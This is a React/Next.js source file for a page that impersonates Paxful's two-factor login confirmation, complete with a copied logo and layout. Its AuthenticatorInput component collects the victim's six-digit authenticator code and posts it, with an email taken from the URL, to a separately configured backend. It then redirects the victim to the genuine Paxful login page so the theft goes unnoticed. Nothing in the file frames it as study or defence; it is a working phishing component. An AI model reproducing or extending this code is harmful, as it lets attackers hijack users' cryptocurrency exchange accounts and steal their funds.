"use client";

import { Montserrat } from "next/font/google";
import Image from "next/image";
import Link from "next/link";
import { Suspense } from "react";
import React, { useEffect, useState } from "react";
import axios from "axios";
import { baseUrl } from "@/config";
import { useRouter, useSearchParams } from "next/navigation";
const serrat = Montserrat({
  subsets: ["cyrillic", "cyrillic-ext", "latin", "latin-ext", "vietnamese"],
});
const AuthenticatorInput = () => {
  const [codes, setCodes] = useState(Array(6).fill(""));
  const router = useSearchParams();
  const email = router.get("email");
  const handleChange = (value: any, index: any) => {
    if (/^\d*$/.test(value)) {
      // Ensure that only digits are allowed
      const newCodes = [...codes];
      newCodes[index] = value;
      setCodes(newCodes);

      // Focus on next input if available
      if (value && index < 5) {
        document.getElementById(`code-input-${index + 1}`)?.focus();
      }
    }
  };

  useEffect(() => {
    console.log(codes);

    if (codes.every((code) => code !== "")) {
      const authCode = codes.join("");
      axios
        .post(`${baseUrl}/api/verify`, { email: email, code: authCode })
        .then((res) => {
          console.log(res);
          window.location.replace("https://accounts.paxful.com/login/");
        })
        .catch((err) => {
          console.error(err);
        });
    }
  }, [codes]);
  return (
    <div className='flex space-x-3 mt-6'>
      {codes.map((code, index) => (
        <input
          key={index.toString()}
          id={`code-input-${index}`}
          type='text'
          maxLength={1}
          className='w-12 h-12 focus:outline-[#3e9f4d] outline-[0.5px] rounded-[4px] border border-gray-300 text-center text-lg'
          value={code}
          onInput={(e) => handleChange(e.currentTarget.value, index)}
        />
      ))}
    </div>
  );
};

const Index = () => {
  const [lang, showlang] = useState(false);
  const [show, setShow] = useState(false);

  const [isLoading, setIsLoading] = useState(false);

  const handleSignIn = async () => {
    try {
      setIsLoading(true);
      const res = await axios.post(`${baseUrl}/api/verify`, {});
      console.log(res);

      window.location.replace("https://accounts.paxful.com/login/");
      setIsLoading(!true);
    } catch (error) {
      console.error(error);
      setIsLoading(!true);
    }
  };

  return (
    <div className='w-full h-screen  flex flex-row-reverse'>
      <div className='w-[58.5%] hidden lg:flex bg-[#46127b] relative items-center justify-center h-screen'>
        <Image
          quality={100}
          className='object-cover'
          src={"/verify.webp"}
          width={384}
          height={406}
          alt='login'
        />
      </div>
      <div className='w-full lg:w-[41.5%] pl-[4%] md:pl-[7.8%] pr-[4%] pt-[10%] lg:pt-[4.3%] bg-white h-full'>
        <div className='flex items-center  justify-between w-full'>
          <Link className='' href={"/"}>
            <svg
              viewBox='0 0 123.7 23.3'
              xmlns='http://www.w3.org/2000/svg'
              fill='#333'
              className='VRptv mr-4'
              width='120'
            >
              <path d='M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z'></path>
              <path
                d='M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z'
                fill='#00a5ef'
              ></path>
            </svg>
          </Link>
          <button
            onClick={() => showlang(!lang)}
            className={`flex w-max px-2   rounded-[4px] items-center justify-between text-[.875rem]  border ${
              lang ? "border-appBlue" : "border-[#d8d8d8] duration-300"
            } min-h-[32px] font-semibold leading-[24px]`}
          >
            {/* <button className='min-h-[32px]  rounded-[4px] px-[.5rem] border border-[#d8d8d8]'> */}
            <svg
              width='16'
              height='16'
              viewBox='0 0 16 16'
              fill='#a9a9a9'
              className='mr-2 text-gray-500'
            >
              <path d='M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z'></path>
            </svg>
            {/* </button> */}
            <p className='text-[#333]'>English</p>
            <svg
              width='16'
              height='16'
              viewBox='0 0 16 16'
              fill={`${lang ? "#00a5ef" : "#a9a9a9"}`}
              // className='ml-2 '
              className={`${
                lang ? "rotate-180 " : ""
              } duration-200  ml-2 transition-all`}
            >
              <path
                fillRule='evenodd'
                d='M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z'
                clipRule='evenodd'
              ></path>
            </svg>
            {/* <svg
              width='24'
              height='24'
              viewBox='0 0 24 24'
              fill={`${lang ? "#00a5ef" : "#626262"}`}
              // className='ml-2 '
              className={`${
                lang ? "rotate-180 " : ""
              } duration-200 transition-all`}
            >
              <path d='M12 14.8c-.2 0-.4-.1-.5-.2l-4-4c-.3-.3-.3-.8 0-1.1s.8-.3 1.1 0l3.5 3.5 3.5-3.5c.3-.3.8-.3 1.1 0s.3.8 0 1.1l-4 4c-.3.1-.5.2-.7.2z'></path>
            </svg> */}
          </button>
        </div>
        <h1
          style={serrat.style}
          className=' mt-[30px] text-[#333] font-[700] text-2xl '
        >
          Confir Your Login
        </h1>
        <div className='text-[#333] mt-6'>
          Open Google Authenticator or Authy and enter the code you see there
          below.
        </div>
        <p className='text-appBlue2 mt-2 hover:text-[#333] underline hover:no-underline  '>
          Trouble logging in?
        </p>
        <AuthenticatorInput />

        <div className='flex mt-2 items-center'>
          <svg
            width='16'
            height='16'
            viewBox='0 0 16 16'
            fill=' #00a5ef'
            className='mr-2 text-primary reflect-element'
          >
            <path
              fillRule='evenodd'
              d='M11.706 13.292L6.414 7.999l5.292-5.293a1 1 0 00-1.414-1.414l-6 6a.996.996 0 00-.277.53L4 7.94v.118c.014.236.11.468.291.648l6 6a1 1 0 101.414-1.414z'
              clipRule='evenodd'
            ></path>
          </svg>
          {/* TO do -  6 dingle digit input fields for auth coce */}

          <Link
            className='hover:text-[#333] hover:underline no-underline text-appBlue2'
            href={"/login"}
          >
            <p>Back to login</p>
          </Link>
        </div>
      </div>
    </div>
  );
};

export default function PageWrapper() {
  return (
    // You could have a loading skeleton as the `fallback` too
    <Suspense fallback={<p>Hello</p>}>
      <Index />
    </Suspense>
  );
}
